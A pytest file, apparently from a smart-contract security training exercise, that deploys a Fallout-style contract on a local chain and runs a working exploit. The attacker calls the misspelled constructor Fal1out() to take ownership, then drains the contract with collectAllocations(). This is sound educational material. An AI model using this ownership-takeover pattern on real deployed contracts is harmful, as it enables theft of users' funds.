import os

import pytest
import solcx

from dojo_test_utils import get_web3_instance, load_w3_contract


@pytest.fixture(scope="module")
def setup_module():
    solcx.install_solc('v0.6.0')  # Fallout is specific to older version
    solcx.set_solc_version('0.6.0')
    file_name = os.path.basename(__file__)
    print(f": Setting up the module {file_name}")
    current_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(current_dir)
    challenge_dir = file_name[5:-3]  # ignore "test_" and ".py"
    challenge_dir = os.path.join(parent_dir, challenge_dir)

    w3 = get_web3_instance()
    vulnerable_contract = load_w3_contract(challenge_dir)
    yield w3, vulnerable_contract
    print(f"\nTearing down the module: {file_name}")


def test_exploit(setup_module):
    w3, vulnerable_contract = setup_module
    deployer_add = vulnerable_contract.functions.owner().call()
    # Since constructor function Fal1out() is misspelled, it is just a normal function, not constructor
    # and the contract is not owned by deployer
    assert deployer_add == "0x0000000000000000000000000000000000000000"
    attacker = w3.eth.accounts[1]
    assert attacker != deployer_add

    for i, acc in enumerate(w3.eth.accounts):
        # mimic the behavior of the real contract Dynamic Pyramid before update
        if acc != attacker:
            vulnerable_contract.functions.allocate().transact({'from': acc, 'value': w3.to_wei(1, 'ether')})
            print(f'Sent 1 ETH to vulnerable_contract from account[{i}]')

    balance_before = w3.from_wei(w3.eth.get_balance(vulnerable_contract.address), 'ether')
    assert float(balance_before) > 0.0
    print('Asserted owner != deployer != attacker')

    attacker_balance_before = w3.from_wei(w3.eth.get_balance(attacker), 'ether')
    print(f"Contract balance before exploit: {balance_before} ETH")
    # actual exploit
    vulnerable_contract.functions.Fal1out().transact({'from': attacker, 'value': w3.to_wei(0.0001, 'ether')})
    assert vulnerable_contract.functions.owner().call() == attacker
    vulnerable_contract.functions.collectAllocations().transact({'from': attacker})

    attacker_balance_after = w3.from_wei(w3.eth.get_balance(attacker), 'ether')
    balance_after = w3.from_wei(w3.eth.get_balance(vulnerable_contract.address), 'ether')
    assert float(balance_after) == 0.0
    assert float(attacker_balance_after) > float(attacker_balance_before)
    print(f"Contract balance after exploit: {balance_after} ETH")
    print(f"Attacker balance before & after exploit: {attacker_balance_before} {attacker_balance_after} ETH")
